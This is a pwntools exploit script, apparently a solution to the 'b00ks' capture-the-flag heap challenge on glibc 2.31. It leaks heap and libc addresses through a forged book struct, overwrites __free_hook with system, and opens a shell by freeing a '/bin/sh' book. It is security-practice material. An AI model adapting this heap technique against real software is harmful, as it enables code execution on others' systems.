# for (Ubuntu GLIBC 2.31-0ubuntu9) stable release version 2.31.

from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./b00ks")
libc = ELF("./libc.so.6")
context.log_level = "INFO"
# gdb.attach(io)

def createbook(name_size, name, desc_size, desc):
    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil(": ")
    io.sendline(str(name_size))
    io.recvuntil(": ")
    io.sendline(name)
    io.recvuntil(": ")
    io.sendline(str(desc_size))
    io.recvuntil(": ")
    io.sendline(desc)

def printbook(id):
    io.recvuntil("> ")
    io.sendline("4")
    
    for i in range(id):
        io.recvuntil(": ")
        book_id = int(io.recvline()[:-1])
        io.recvuntil(": ")
        book_name = io.recvline()[:-1]
        io.recvuntil(": ")
        book_desc = io.recvline()[:-1]
        io.recvuntil(": ")
        book_author = io.recvline()[:-1]
    return book_id, book_name, book_desc, book_author

def init_name(name):
    io.recvuntil("name: ")
    io.sendline(name)

def changename(name):
    io.recvuntil("> ")
    io.sendline("5")
    io.recvuntil(": ")
    io.sendline(name)

def editbook(book_id, desc):
    io.recvuntil("> ")
    io.sendline("3")
    io.recvuntil(": ")
    io.sendline(str(book_id))
    io.recvuntil(": ")
    io.sendline(desc)

def deletebook(book_id):
    io.recvuntil("> ")
    io.sendline("2")
    io.sendafter(": ", str(book_id))

def probe_libcbase():
    return

init_name("A" * 32)
createbook(72, "a", 32, "a")
createbook(0x21000, "/bin/sh", 0x21000, "a")

book_id, book_name, book_desc, book_author = printbook(1)
book1_addr = u64(book_author[32:38].ljust(8, "\x00"))
log.success("book1 address: 0x%x" % book1_addr)

# fake book1: id 1, pointer to book2 name,  pointer to book2 desc
payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
editbook(book_id, payload)
changename("A" * 32)

book_id, book_name, book_desc, book_author = printbook(1)
book2_name_addr = u64(book_name.ljust(8, "\x00"))
book2_desc_addr = u64(book_desc.ljust(8, "\x00"))

libc_base = book2_name_addr + 0x21FF0

free_hook = libc_base + libc.symbols["__free_hook"]
system_addr = libc_base + libc.symbols["system"]
editbook(1, p64(free_hook))
editbook(2, p64(system_addr))
deletebook(2)

io.interactive()